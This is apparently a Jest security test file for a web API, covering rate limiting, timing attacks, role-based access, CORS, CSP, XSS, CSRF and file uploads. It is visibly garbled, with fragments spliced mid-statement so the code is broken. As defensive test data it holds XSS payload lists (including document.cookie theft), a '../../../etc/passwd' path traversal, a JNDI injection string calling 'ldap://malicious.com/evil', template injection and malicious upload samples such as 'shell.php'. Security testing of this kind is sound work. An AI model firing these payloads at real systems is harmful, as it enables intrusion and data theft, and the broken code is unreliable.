    const rateLimitedResponses = responses.filter(r => r.status === 429);\n      expect(rateLimitedResponses.length).toBeGreaterThan(0);\n    });\n\n    it('should not reveal user existence through 'wrong-password',\n        }, {\n          validateStatus: () => true,\n        });\n        return Date.now() - startTime;\n      };\n      \n      const existingUserTimes = await Promise.all([\n        measureResponseTime(existingUser),\n        measureResponseTime(existingUser),\n        measureResponseTime(existingUser),\n      ]);\n      \n      const nonExistentUserTimes = await Promise.all([\n        measureResponseTime(nonExistentUser),\n        measureResponseTime(nonExistentUser),\n        measureResponseTime(nonExistentUser),\n      ]);\n      \n      const avgExistingTime = existingUserTimes.reduce((a, b) => a + b, 0) / existingUserTimes.length;\n      const avgNonExistentTime = nonExistentUserTimes.reduce((a, b) => a + b, 0) / nonExistentUserTimes.length;\n      \n      // Response times should be similar (within 100ms) to prevent timing attacks\n      const timeDifference = Math.abs(avgExistingTime - avgNonExistentTime);\n      expect(timeDifference).toBeLessThan(100);\n    });\n  });\n\n  describe('Session Management Security', () => {\n    it('should invalidate sessions on logout', async () => {\n      // First, login mockCreds.testUserPassword,\n      }, {\n        validateStatus: () => true,\n      });\n      \n      if (response.headers['set-cookie']) {\n        const cookies = response.headers['set-cookie'];\n Security Tests', () => {\n  const baseUrl = global.SECURITY_CONFIG.baseUrl;\n  const mockCreds = global.MOCK_CREDENTIALS;\n  \n  beforeEach(() => {\n    jest.clearAllMocks();\n  });\n\n  describe('Role-Based Access Control (RBAC)', () => {\n    it('should prevent privilege escalation attempts', async () => {\n      // Test with regular user token trying to access admin endpoints\n      const adminEndpoints = [\n        '/api/admin/users',\n        '/api/admin/system/config',\n        '/api/admin/logs',\n        '/api/admin/metrics',\n        '/api/admin/deployments',\n      ];\n\n expect(response.data).toHaveProperty('error');\n      }\n    });\n\n    it('should enforce proper role separation', async () => {\n      const roleTestCases = [\n        {\n          role: 'user',\n          token: mockCreds.validToken,\n          allowedEndpoints: [\n            '/api/programs',\n            '/api/documents',\n            '/api/analysis',\n          ],\n          deniedEndpoints: mockCreds.sqlInjectionToken,\n        '',\n        'null',\n        'undefined',\n      ];\n\n      for (const apiKey of invalidApiKeys) {\n        const response = await expect(response.status).toBe(401);\n      }\n    });\n\n    it('should enforce API key rate limits', async () => {\n      const requests = [];\n      \n      // Make multiple requests with the same API key\n      for (let i = 0; i < 20; i++) {\n        requests.push(\n          axios.get(`${baseUrl}/api/external/curriculum`, {\n            headers: {\n              'X-API-Key': mockCreds.testApiKey,\n            },\n            validateStatus: () => true,\n          })\n        );\n      }\n      \n      const responses = await Promise.all(requests);\n      const });\n\n  describe('Cross-Origin Resource Sharing (CORS)', () => {\n    it('should implement proper CORS policies', async () => {\n      const response = await axios.options(`${baseUrl}/api/programs`, {\n        headers: {\n          'Origin': 'https://malicious-site.com',\n          'Access-Control-Request-Method': 'GET',\n        },\n        validateStatus: () => true,\n      });\n      \n      // Should either deny the origin or have proper CORS headers\n      if (response.status === 200) {\n        const allowedOrigins = response.headers['access-control-allow-origin'];\n        expect(allowedOrigins).not.toBe('*');\n        expect(allowedOrigins).not.toContain('malicious-site.com');\n      } else {\n        expect(response.status).toBeOneOf([403, 404]);\n      }\n    });\n\n    it('should prevent CORS bypass attempts', async () => {\n      const corsBypassAttempts = [\n        { 'Origin': 'null' },\n        { 'Origin': 'https://trusted-site.com.malicious.com' },\n        { 'Origin': 'https://trusted-site.com%2emalicious.com' },\n        { 'Origin': 'https://trusted-site.com@malicious.com' },\n      ];\n\n      for (const headers of corsBypassAttempts) {\n        const response = await axios.get(`${baseUrl}/api/programs`, {\n          headers: {\n            ...headers,\n            'Authorization': `Bearer ${mockCreds.validToken}`,\n          },\n          validateStatus: () => true,\n        });\n        \n        if (response.headers['access-control-allow-origin']) {\n          expect(response.headers['access-control-allow-origin']).not.toBe('null');\n          expect(response.headers['access-control-allow-origin']).not.toContain('malicious');\n        }\n      }\n    });\n  });\n\n  describe('Content Security Policy (CSP)', () => {\n    it('should implement Content Security Policy headers', async () => {\n      const response = await axios.get(`${baseUrl}/`, {\n        validateStatus: () => true,\n      });\n      \n      const cspHeader = response.headers['content-security-policy'] || \n                       response.headers['x-content-security-policy'];\n      \n      if (cspHeader) {\n        expect(cspHeader).toContain(\"default-src\");\n        expect(cspHeader).not.toContain(\"'unsafe-eval'\");\n        expect(cspHeader).not.toContain(\"'unsafe-inline'\");\n      }\n    });\n\n    it('should prevent XSS through CSP violations', async () => {\n      const xssAttempts = [\n headers: {\n            'Authorization': `Bearer ${mockCreds.validToken}`,\n          },\n          validateStatus: () => true,\n        });\n        \n        // Should either reject the input or sanitize it\n        if (response.status === 200 || response.status === 201) {\n          expect(response.data.name).not.toContain('<script>');\n          expect(response.data.name).not.toContain('javascript:');\n          expect(response.data.name).not.toContain('vbscript:');\n        }\n      }\n    });\n  });\n\n  describe('Parameter Pollution and    const maliciousInputs = [\n        { name: mockCreds.sqlInjectionToken, description: 'Normal description' },\n        { name: 'Normal name', description: mockCreds.maliciousToken },\n        { name: '../../../etc/passwd', description: 'Path traversal attempt' },\n        { name: '${jndi:ldap://malicious.com/evil}', description: 'JNDI injection' },\n        { name: '{{7*7}}', description: expect(response.data.description).not.toContain('${jndi:');\n          expect(response.data.description).not.toContain('{{7*7}}');\n        }\n      }\n    });\n  });\n\n  describe('File Upload Security Tests', () => {\n  const baseUrl = global.SECURITY_CONFIG.baseUrl;\n  const mockCreds = global.MOCK_CREDENTIALS;\n  \n  beforeEach(() => {\n    jest.clearAllMocks();\n  });\n\n  describe('Cross-Site Scripting (XSS) Protection', () => {\n    it('should prevent stored XSS attacks', async () => {\n      const xssPayloads = [\n        '<script>alert(\"XSS\")</script>',\n        '<img src=\"x\" onerror=\"alert(\\'XSS\\')\">',\n        '<svg onload=\"alert(\\'XSS\\')\">',\n        '<iframe src=\"javascript:alert(\\'XSS\\')\"></iframe>',\n        '<object     '<select onfocus=\"alert(\\'XSS\\')\" autofocus>',\n        '<textarea onfocus=\"alert(\\'XSS\\')\" autofocus>',\n        '<keygen onfocus=\"alert(\\'XSS\\')\" autofocus>',\n expect(response.data.name).not.toMatch(/javascript:/gi);\n          expect(response.data.description).not.toMatch(/<script.*?>.*?<\\/script>/gi);\n        }\n      }\n    });\n\n    it('should prevent reflected XSS attacks', async () => {\n      const reflectedXssPayloads = [\n        '<script>alert(\"reflected-xss\")</script>',\n        '\"><script>alert(document.cookie)</script>',\n        '\\'-alert(String.fromCharCode(88,83,83))-\\'',\n        '<img src=x onerror=alert(\"XSS\")>',\n        '</script><script>alert(\"XSS\")</script>',\n      ];\n\n      for (const payload of ${mockCreds.validToken}`,\n          },\n          validateStatus: () => true,\n        });\n\n        // Verify response doesn't reflect unescaped XSS\n        const responseText = JSON.stringify(response.data);\n        expect(responseText).not.toMatch(/<script.*?>.*?<\\/script>/gi);\n        expect(responseText).not.toMatch(/on\\w+\\s*=/gi);\n        expect(responseText).not.toMatch(/javascript:/gi);\n      }\n    });\n\n    it('should prevent DOM-based XSS through URL fragments', async () => {\n      const domXssPayloads = [\n        '#<script>alert(\"DOM-XSS\")</script>',\n        '#javascript:alert(\"DOM-XSS\")',\n        '#<img src=x onerror=alert(\"DOM-XSS\")>',\n      ];\n\n      for (const payload of domXssPayloads) {\n        // Test that fragment-based payloads don't get processed server-side\n        const response = await axios.get(`${baseUrl}/api/programs${payload}`, {\n          headers: {\n            'Authorization': `Bearer ${mockCreds.validToken}`,\n          },\n          validateStatus: () => true,\n        });\n\n        // Server should ignore fragment identifiers\n        expect(response.status).not.toBe(500);\n        const responseText = JSON.stringify(response.data);\n        expect(responseText).not.toMatch(/<script.*?>.*?<\\/script>/gi);\n      }\n    });\n  });\n\n  describe('CSRF Protection', () => {\n    it('should require CSRF tokens for state-changing operations', async () => {\n      const stateChangingEndpoints = [\n        { method: 'POST', endpoint: '/api/programs', data: { name: 'Test', description: 'Test' }},\n        { method: 'PUT', endpoint: '/api/programs/1', data: { name: 'Updated' }},\n        { method: 'DELETE', endpoint: '/api/programs/1' },\n        { method: 'POST', endpoint: '/api/analysis', data: { programId: 1 }},\n      ];\n\n      for (const test of stateChangingEndpoints) {\n        // Request without CSRF token should fail\n        const response = await axios.request({\n          method: test.method,\n          url: `${baseUrl}${test.endpoint}`,\n          data: test.data,\n          headers: {\n            'Authorization': `Bearer ${mockCreds.validToken}`,\n          },\n          validateStatus: () => true,\n        });\n\n        // Should require CSRF token or use other CSRF protection\n        if (response.status === 403) {\n          expect(response.data.error).toMatch(/csrf|token|forbidden/i);\n        }\n      }\n    });\n\n    it('should validate CSRF tokens properly', async () => {\n      const invalidCsrfTokens = [\n        'invalid-csrf-token',\n        mockCreds.maliciousToken,\n        'expired-csrf-token',\n        '',\n        'null',\n        'undefined',\n      ];\n\n      for (const csrfToken of invalidCsrfTokens) {\n        const response = await axios.post(`${baseUrl}/api/programs`, {\n          name: 'Test Program',\n          description: 'Test Description',\n        }, {\n          headers: {\n            'Authorization': `Bearer ${mockCreds.validToken}`,\n            'X-CSRF-Token': csrfToken,\n          },\n          validateStatus: () => true,\n        });\n\n        // Invalid CSRF tokens should be rejected\n        if (response.status === 403) {\n          expect(response.data.error).toMatch(/csrf|token|invalid/i);\n        }\n      }\n    });\n  });\n\n  describe('File Upload Validation', () => {\n    it('should validate file types and extensions', async () => {\n      const maliciousFiles = [\n        { name: 'malicious.exe', content: 'MZ\\x90\\x00\\x03', type: 'application/octet-stream' },\n        { name: 'script.js', content: 'alert(\"XSS\")', type: 'application/javascript' },\n        { name: 'shell.php', content: '<?php
